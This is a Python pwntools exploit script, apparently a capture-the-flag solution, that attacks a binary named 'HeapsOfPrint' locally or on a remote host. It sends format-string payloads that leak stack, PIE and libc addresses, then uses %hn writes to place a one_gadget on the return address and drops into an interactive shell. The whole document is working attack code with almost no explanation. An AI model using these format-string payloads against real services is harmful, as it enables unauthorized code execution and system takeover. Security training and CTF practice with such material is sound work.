from pwn import *
import string
context.binary = './HeapsOfPrint'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc

def dbg():
	raw_input()


if args['REMOTE']:
	p = remote('47.106.94.13', 50023)
	#libc = ELF('../x64_libc.so.6')
else:
	p = process('./HeapsOfPrint')
	gdb.attach(p)
	dbg()

p.recvuntil('character is ')
leakchar = ord(p.recv(1))
print "leakchar ==> " + hex(leakchar)

payload = ('%%%du%%6$hhn' % (leakchar - 0x7)).rjust(100, ' ')
payload += '%6$p.%7$p+%17$p]'

p.sendlineafter("Is it?", payload)

p.recvuntil('1')
stack_addr = int(p.recvuntil('.').strip('.'), 16)
pie_addr = int(p.recvuntil('+').strip('+'), 16) - 0x8f0
__libc_start_main_addr = int(p.recvuntil(']').strip(']'), 16) - 240

libc_base = __libc_start_main_addr - libc.symbols['__libc_start_main']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search("/bin/sh\x00"))
free_hook = 0x3C67A8 + libc_base
one_gadget = libc_base + 0x45216

print "stack_addr ==> " + hex(stack_addr)
print "pie_addr ==> " + hex(pie_addr)
print "__libc_start_main_addr ==> " + hex(__libc_start_main_addr)
print "libc_base ==> " + hex(libc_base)
print "free_hook ==> " + hex(free_hook)
print "one_gadget ==> " + hex(one_gadget)

#write two libcaddr* to stack									#loop again
ret_start = stack_addr - 0xa8
len1 = ret_start & 0xffff
len2 = (stack_addr - 0x48) & 0xffff 							#low word address									
len3 = (stack_addr - 0x46) & 0xffff								#high word address


payload = '%' + str(len1) + 'c%6$hn'
payload += '%' + str(len2 - len1) + 'c%47$hn'					#environ
payload += '%' + str(len3 - len2) + 'c%48$hn'					#filename
p.sendlineafter("Is it?", payload)

#write  one_gadget to the above two stack pointer overwrite the libcaddr
ret_start = stack_addr - 0xc8
len1 = ret_start & 0xffff
len2 = one_gadget & 0xffff							#low wrod address
len3 = (one_gadget & 0xffff0000)	>> 16				#high word address	
payload = '%' + str(len1) + 'c%6$hn'
payload += '%' + str(len3 - len1) + 'c%97$hn'				#high word
payload += '%' + str(len2 - len3) + 'c%99$hn'		#low word
p.sendlineafter("Is it?", payload)


#write one_gadget to ret_addr
ret_start = stack_addr - 0x50
len1 = ret_start & 0xffff

payload = '%' + str(len1) + 'c%6$hn'
p.sendlineafter("Is it?", payload)


p.interactive()
p.close()